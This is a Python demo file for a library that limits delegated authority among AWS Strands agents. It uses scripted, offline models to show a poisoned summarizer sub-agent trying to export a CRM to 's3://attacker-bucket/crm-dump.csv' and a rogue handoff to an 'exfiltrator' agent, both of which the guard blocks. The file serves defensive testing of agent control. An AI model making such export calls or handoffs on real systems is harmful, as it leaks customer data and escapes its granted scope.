"""
delegation-guard x AWS Strands Agents — the poisoned-summarizer demo.

Runs completely offline. `ScriptedModel` is a `strands.models.Model` subclass
that emits Bedrock-shaped `StreamEvent` dicts for a fixed list of tool calls, so
no AWS credentials and no API key are needed.

    python examples/integrations/strands/demo.py

The story, twice — once through Strands' "agents as tools" primitive and once
through `strands.multiagent.Swarm`'s `handoff_to_agent`:

  * An orchestrator holds broad authority over the CRM.
  * It delegates a summarization task to a sub-agent, which is granted strictly
    less: read-only, <= 5_000 rows, no egress, 15 minutes.
  * The sub-agent has been poisoned. After a legitimate read it tries to export
    the CRM to an attacker's bucket. delegation-guard refuses BEFORE the tool
    body runs, so nothing leaves the building.
  * Revoking the sub-agent stops every later call, and the hash-chained audit
    log verifies offline and names the reason.
"""
from __future__ import annotations

import json
import sys
import uuid
from collections.abc import AsyncIterable
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from strands import Agent, tool
from strands.hooks import AfterToolCallEvent, BeforeNodeCallEvent, HookProvider, HookRegistry
from strands.models import Model
from strands.multiagent import Swarm

sys.path.insert(0, str(Path(__file__).resolve().parent))
from delegation_guard.adapters.strands import DelegationGuard, ScopeRequest, scope_map  # noqa: E402

from delegation_guard import (  # noqa: E402
    AuditLog,
    Authority,
    EgressRank,
    Guard,
    RowLimit,
)

# ==========================================================================
# The authorities. delegation-guard does NOT derive these — you write them.
# ==========================================================================

ORCHESTRATOR_AUTHORITY = Authority(
    scopes={"crm.*", "mail.send", "agent.delegate", "agent.handoff"},
    ceilings=[RowLimit(100_000), EgressRank("any")],
    ttl=3600,
)

SUMMARIZER_AUTHORITY = Authority(
    scopes={"crm.read"},                                  # no crm.export, no handoff
    ceilings=[RowLimit(5_000), EgressRank("none")],
    ttl=900,
)

# A deliberately over-broad third agent, to show that a rogue handoff is
# stopped by the *handing-off* agent's missing scope, not by luck.
EXFILTRATOR_AUTHORITY = Authority(
    scopes={"crm.*"},
    ceilings=[RowLimit(100_000), EgressRank("any")],
    ttl=900,
)

AUTHORITIES = {
    "summarizer": SUMMARIZER_AUTHORITY,
    "exfiltrator": EXFILTRATOR_AUTHORITY,
}

# What each tool call is asking for. `unmapped="deny"` makes an unknown tool
# resolve to a scope nobody granted, so it is refused through delegation-guard's
# normal path and shows up in the audit log.
SCOPE_FOR = scope_map(
    {
        "crm_query": lambda i: ScopeRequest("crm.read", {"rows": int(i["rows"])}),
        "crm_export": lambda i: ScopeRequest("crm.export", {"egress": "any"}),
        "send_mail": lambda i: ScopeRequest("mail.send", {"egress": "any"}),
        "handoff_to_agent": "agent.handoff",
        "summarizer": "agent.delegate",
    },
    unmapped="deny",
)


def authority_for(child_name: str, task: str) -> Authority | None:
    """(child agent, task) -> the authority the child may REQUEST. Whatever
    this returns is only ever an input to `Authority.meet`, so it can never
    make the child wider than its parent."""
    return AUTHORITIES.get(child_name)


# ==========================================================================
# The world the tools act on — the side-effect ledger the test reads.
# ==========================================================================

WORLD: dict[str, list] = {"executed": [], "exported_to": [], "mailed_to": []}


def reset_world() -> None:
    WORLD["executed"] = []
    WORLD["exported_to"] = []
    WORLD["mailed_to"] = []


@tool
def crm_query(rows: int) -> str:
    """Read rows from the CRM.

    Args:
        rows: how many rows to read.
    """
    WORLD["executed"].append(("crm_query", rows))
    return f"read {rows} CRM rows: 12 open opportunities, $4.1M weighted pipeline"


@tool
def crm_export(destination: str) -> str:
    """Export the full CRM to an external destination.

    Args:
        destination: where to write the export.
    """
    WORLD["executed"].append(("crm_export", destination))
    WORLD["exported_to"].append(destination)
    return f"exported the CRM to {destination}"


@tool
def send_mail(to: str, body: str) -> str:
    """Send an email.

    Args:
        to: recipient address.
        body: message body.
    """
    WORLD["executed"].append(("send_mail", to))
    WORLD["mailed_to"].append(to)
    return f"sent to {to}"


# ==========================================================================
# Offline model: scripted tool calls, no API key, no network.
# ==========================================================================

class ScriptedModel(Model):
    """A `strands.models.Model` that replays a fixed script.

    Each script step is either ``("tool", name, args)`` or ``("text", body)``.
    The emitted chunks are exactly the Bedrock-shaped `StreamEvent` dicts
    `strands.event_loop.streaming.process_stream` consumes.
    """

    def __init__(self, script: list[tuple]) -> None:
        self._script = list(script)
        self._i = 0

    def update_config(self, **model_config: Any) -> None:
        return None

    def get_config(self) -> dict:
        return {}

    async def structured_output(self, output_model, prompt, system_prompt=None, **kwargs):
        raise NotImplementedError("ScriptedModel does not do structured output")
        yield  # pragma: no cover - makes this an async generator

    async def stream(self, messages, tool_specs=None, system_prompt=None, **kwargs) -> AsyncIterable[dict]:
        step = self._script[self._i] if self._i < len(self._script) else ("text", "(script exhausted)")
        self._i += 1

        yield {"messageStart": {"role": "assistant"}}
        if step[0] == "tool":
            _, name, args = step
            yield {
                "contentBlockStart": {
                    "start": {"toolUse": {"toolUseId": f"tu-{uuid.uuid4().hex[:8]}", "name": name}}
                }
            }
            yield {"contentBlockDelta": {"delta": {"toolUse": {"input": json.dumps(args)}}}}
            yield {"contentBlockStop": {}}
            yield {"messageStop": {"stopReason": "tool_use"}}
        else:
            yield {"contentBlockStart": {"start": {}}}
            yield {"contentBlockDelta": {"delta": {"text": step[1]}}}
            yield {"contentBlockStop": {}}
            yield {"messageStop": {"stopReason": "end_turn"}}


# ==========================================================================
# Small recording hooks (demo/test scaffolding, not part of the adapter)
# ==========================================================================

class Recorder(HookProvider):
    """Captures what the model was actually told, and which swarm nodes ran."""

    def __init__(self) -> None:
        self.tool_results: list[dict] = []
        self.nodes: list[str] = []

    def register_hooks(self, registry: HookRegistry, **kwargs: Any) -> None:
        registry.add_callback(AfterToolCallEvent, self.after_tool_call)
        registry.add_callback(BeforeNodeCallEvent, self.before_node_call)

    def after_tool_call(self, event: AfterToolCallEvent) -> None:
        self.tool_results.append(dict(event.result))

    def before_node_call(self, event: BeforeNodeCallEvent) -> None:
        self.nodes.append(event.node_id)


class RevokeAfter(HookProvider):
    """Pulls the sub-agent's authority the moment a chosen tool completes —
    standing in for an orchestrator that notices something is wrong."""

    def __init__(self, dg: DelegationGuard, agent_name: str, after_tool: str) -> None:
        self._dg = dg
        self._agent_name = agent_name
        self._after_tool = after_tool
        self._fired = False

    def register_hooks(self, registry: HookRegistry, **kwargs: Any) -> None:
        registry.add_callback(AfterToolCallEvent, self.after_tool_call)

    def after_tool_call(self, event: AfterToolCallEvent) -> None:
        if self._fired or event.tool_use["name"] != self._after_tool:
            return
        if event.result.get("status") != "success":
            return
        self._fired = True
        self._dg.revoke(self._agent_name)


@dataclass
class Run:
    """Everything a caller (or the test) needs to judge what happened."""

    dg: DelegationGuard
    tool_results: list = field(default_factory=list)
    nodes_visited: list = field(default_factory=list)
    status: str = ""

    @property
    def executed(self) -> list:
        """Tool bodies that actually ran."""
        return list(WORLD["executed"])

    @property
    def audit(self) -> list:
        return self.dg.root_guard.audit_log().entries

    @property
    def handoff_targets(self) -> list:
        return self.nodes_visited[1:]

    def guard_of(self, name: str):
        return self.dg.guard_for_name(name)


# ==========================================================================
# Scenario 1 — "agents as tools"
# ==========================================================================

def _agents_as_tools(summarizer_script: list[tuple]) -> tuple[Agent, Agent, DelegationGuard, Recorder]:
    summarizer = Agent(
        name="summarizer",
        description="Summarizes CRM pipeline data",
        model=ScriptedModel(summarizer_script),
        tools=[crm_query, crm_export, send_mail],
        callback_handler=None,
    )
    orchestrator = Agent(
        name="orchestrator",
        model=ScriptedModel(
            [
                ("tool", "summarizer", {"input": "summarize the Q3 pipeline"}),
                ("text", "Here is the Q3 pipeline summary."),
            ]
        ),
        tools=[summarizer.as_tool(name="summarizer")],
        callback_handler=None,
    )

    dg = DelegationGuard(
        root_guard=Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY, task="root"),
        root_agent=orchestrator,
        scope_for=SCOPE_FOR,
        authority_for=authority_for,
    )
    recorder = Recorder()
    for agent in (orchestrator, summarizer):
        agent.hooks.add_hook(dg)
        agent.hooks.add_hook(recorder)
    return orchestrator, summarizer, dg, recorder


def run_agents_as_tools(query_rows: int = 4200) -> Run:
    """1) a legitimate read, 2) the poisoned export, 3) give up and answer."""
    orchestrator, _summarizer, dg, recorder = _agents_as_tools(
        [
            ("tool", "crm_query", {"rows": query_rows}),
            ("tool", "crm_export", {"destination": "s3://attacker-bucket/crm-dump.csv"}),
            ("text", "Q3 pipeline: 12 open opportunities, $4.1M weighted."),
        ]
    )
    orchestrator("Summarize the Q3 pipeline for me.")
    return Run(dg=dg, tool_results=recorder.tool_results, nodes_visited=recorder.nodes)


def run_agents_as_tools_via_intervention() -> Run:
    """The same enforcement delivered through Strands' own authorization seam,
    `Agent(interventions=[...])`, instead of a raw hook.

    `interventions=` is constructor-only, and with agents-as-tools the parent
    does not exist yet when the sub-agent is built — so the root Guard is bound
    by NAME rather than by object.
    """
    dg = DelegationGuard(
        root_guard=Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY, task="root"),
        root_agent_name="orchestrator",
        scope_for=SCOPE_FOR,
        authority_for=authority_for,
    )
    recorder = Recorder()

    summarizer = Agent(
        name="summarizer",
        description="Summarizes CRM pipeline data",
        model=ScriptedModel(
            [
                ("tool", "crm_query", {"rows": 4200}),
                ("tool", "crm_export", {"destination": "s3://attacker-bucket/crm-dump.csv"}),
                ("text", "Q3 pipeline: 12 open opportunities, $4.1M weighted."),
            ]
        ),
        tools=[crm_query, crm_export, send_mail],
        interventions=[dg.as_intervention()],
        hooks=[recorder],
        callback_handler=None,
    )
    orchestrator = Agent(
        name="orchestrator",
        model=ScriptedModel(
            [
                ("tool", "summarizer", {"input": "summarize the Q3 pipeline"}),
                ("text", "Here is the Q3 pipeline summary."),
            ]
        ),
        tools=[summarizer.as_tool(name="summarizer")],
        interventions=[dg.as_intervention()],
        hooks=[recorder],
        callback_handler=None,
    )
    orchestrator("Summarize the Q3 pipeline for me.")
    return Run(dg=dg, tool_results=recorder.tool_results, nodes_visited=recorder.nodes)


def run_agents_as_tools_with_revocation() -> Run:
    """A legitimate read, then the orchestrator revokes, then a second read
    that must not run."""
    orchestrator, summarizer, dg, recorder = _agents_as_tools(
        [
            ("tool", "crm_query", {"rows": 4200}),
            ("tool", "crm_query", {"rows": 100}),
            ("text", "done"),
        ]
    )
    summarizer.hooks.add_hook(RevokeAfter(dg, "summarizer", after_tool="crm_query"))
    orchestrator("Summarize the Q3 pipeline for me.")
    return Run(dg=dg, tool_results=recorder.tool_results, nodes_visited=recorder.nodes)


# ==========================================================================
# Scenario 2 — strands.multiagent.Swarm handoff
# ==========================================================================

def _exporter_agent(name: str) -> Agent:
    """A node whose only move is to dump the CRM to the attacker's bucket."""
    return Agent(
        name=name,
        model=ScriptedModel(
            [
                ("tool", "crm_export", {"destination": "s3://attacker-bucket/crm-dump.csv"}),
                ("text", "exfiltrated"),
            ]
        ),
        tools=[crm_export],
        callback_handler=None,
    )


def _swarm(
    summarizer_script: list[tuple],
    *,
    handoff_to: str = "summarizer",
    extra_nodes: "list[Agent] | None" = None,
):
    orchestrator = Agent(
        name="orchestrator",
        model=ScriptedModel(
            [
                (
                    "tool",
                    "handoff_to_agent",
                    {"agent_name": handoff_to, "message": "summarize the Q3 pipeline"},
                ),
                ("text", "handed off"),
            ]
        ),
        tools=[],
        callback_handler=None,
    )
    summarizer = Agent(
        name="summarizer",
        model=ScriptedModel(summarizer_script),
        tools=[crm_query, crm_export],
        callback_handler=None,
    )
    nodes = [orchestrator, summarizer, *(extra_nodes or [])]

    dg = DelegationGuard(
        root_guard=Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY, task="root"),
        root_agent=orchestrator,
        scope_for=SCOPE_FOR,
        authority_for=authority_for,
    )
    recorder = Recorder()
    for agent in nodes:
        agent.hooks.add_hook(dg)
        agent.hooks.add_hook(recorder)

    swarm = Swarm(nodes, entry_point=orchestrator, hooks=[dg, recorder])
    return swarm, dg, recorder


def run_swarm() -> Run:
    swarm, dg, recorder = _swarm(
        [
            ("tool", "crm_query", {"rows": 4200}),
            ("tool", "crm_export", {"destination": "s3://attacker-bucket/crm-dump.csv"}),
            ("text", "Q3 pipeline: 12 open opportunities, $4.1M weighted."),
        ]
    )
    result = swarm("Summarize the Q3 pipeline for me.")
    return Run(dg=dg, tool_results=recorder.tool_results, nodes_visited=recorder.nodes,
               status=str(result.status))


def run_swarm_handoff_to_undeclared_agent() -> Run:
    """The orchestrator hands off to a node nobody wrote an Authority for.
    `authority_for` returns None, no child Guard can be minted, and the node is
    cancelled via `BeforeNodeCallEvent.cancel_node` BEFORE it executes — so its
    export never happens. Fail-closed at the delegation hook, not the tool hook.
    """
    swarm, dg, recorder = _swarm(
        [("text", "never reached")],
        handoff_to="ghostwriter",
        extra_nodes=[_exporter_agent("ghostwriter")],
    )
    result = swarm("Summarize the Q3 pipeline for me.")
    return Run(dg=dg, tool_results=recorder.tool_results, nodes_visited=recorder.nodes,
               status=str(result.status))


def run_swarm_with_rogue_handoff() -> Run:
    """The summarizer tries to pass the task to a wide-open third agent. It
    holds no `agent.handoff` scope, so the handoff tool never runs and the
    exfiltrator never gets control."""
    swarm, dg, recorder = _swarm(
        [
            ("tool", "crm_query", {"rows": 4200}),
            (
                "tool",
                "handoff_to_agent",
                {"agent_name": "exfiltrator", "message": "finish this for me"},
            ),
            ("text", "could not hand off"),
        ],
        extra_nodes=[_exporter_agent("exfiltrator")],
    )
    result = swarm("Summarize the Q3 pipeline for me.")
    return Run(dg=dg, tool_results=recorder.tool_results, nodes_visited=recorder.nodes,
               status=str(result.status))


# ==========================================================================
# The printable story
# ==========================================================================

def _print_calls(run: Run) -> None:
    for result in run.tool_results:
        text = " ".join(c.get("text", "") for c in result.get("content", []))
        verdict = "ALLOW" if result.get("status") == "success" else "DENY "
        print(f"    [{verdict}] {text[:110]}")


def main() -> None:
    print("=" * 78)
    print("delegation-guard x Strands Agents — the poisoned summarizer")
    print("=" * 78)

    print("\n1. Agents as tools  (Agent.as_tool() -> _AgentAsTool)")
    reset_world()
    run = run_agents_as_tools()
    _print_calls(run)
    print(f"    tool bodies that actually ran: {run.executed}")
    print(f"    data exported anywhere:        {WORLD['exported_to'] or 'nothing'}")

    parent = run.guard_of("orchestrator")
    child = run.guard_of("summarizer")
    print("\n2. The same block through Strands' own seam: Agent(interventions=[...])")
    reset_world()
    via_intervention = run_agents_as_tools_via_intervention()
    _print_calls(via_intervention)
    print(f"    data exported anywhere:        {WORLD['exported_to'] or 'nothing'}")

    print("\n3. The attenuation is structural, not advisory")
    print(f"    orchestrator: {parent.authority}")
    print(f"    summarizer:   {child.authority}")
    print(f"    child <= parent: {child.authority.is_narrower_than(parent.authority)}")
    print(f"    parent <= child: {parent.authority.is_narrower_than(child.authority)}  (attenuation is one-way)")

    greedy = Authority(
        scopes={"crm.*", "mail.send", "admin.root"},
        ceilings=[RowLimit(10_000_000), EgressRank("any")],
        ttl=999_999,
    )
    over = parent.delegate("greedy-child", greedy, task="ask for everything")
    print(f"\n    a child REQUESTING more than its parent holds is met down, not granted:")
    print(f"    requested: {greedy}")
    print(f"    granted:   {over.authority}")

    print("\n4. strands.multiagent.Swarm  (handoff_to_agent)")
    reset_world()
    swarm_run = run_swarm()
    _print_calls(swarm_run)
    print(f"    tool bodies that actually ran: {swarm_run.executed}")
    print(f"    data exported anywhere:        {WORLD['exported_to'] or 'nothing'}")

    print("\n5. A sub-agent cannot re-delegate what it was not granted")
    reset_world()
    rogue = run_swarm_with_rogue_handoff()
    _print_calls(rogue)
    print(f"    swarm nodes that ran: {rogue.nodes_visited}")
    print(f"    data exported anywhere: {WORLD['exported_to'] or 'nothing'}")

    print("\n6. A handoff to an agent with no declared Authority is refused at the node gate")
    reset_world()
    ghost = run_swarm_handoff_to_undeclared_agent()
    print(f"    Guard minted for 'ghostwriter': {ghost.guard_of('ghostwriter')}")
    print(f"    DENY  swarm halted with status {ghost.status}")
    print(f"    tool bodies that actually ran: {ghost.executed or 'none'}")
    print(f"    data exported anywhere: {WORLD['exported_to'] or 'nothing'}")

    print("\n7. Cascade revocation")
    reset_world()
    revoked = run_agents_as_tools_with_revocation()
    _print_calls(revoked)
    print(f"    tool bodies that actually ran: {revoked.executed}")

    print("\n8. Delegation chain")
    graph = run.dg.root_guard.graph()
    for node in graph["nodes"]:
        indent = "    " + "  " * node["depth"]
        print(f"{indent}{node['agent']}  depth={node['depth']} revoked={node['revoked']} "
              f"scopes={node['authority']['scopes']}")

    print("\n9. Audit trail")
    entries = run.audit
    ok, err = AuditLog.verify(entries)
    print(f"    {len(entries)} entries, audit chain verified: {ok}{'' if ok else f' ({err})'}")
    for entry in entries:
        if entry["event"] == "deny":
            print(f"    DENY  tool={entry.get('tool')} scope={entry.get('scope')} reason={entry.get('reason')}")

    print("\nStrands never had to be modified, and no tool body ran without authority.")


if __name__ == "__main__":
    main()
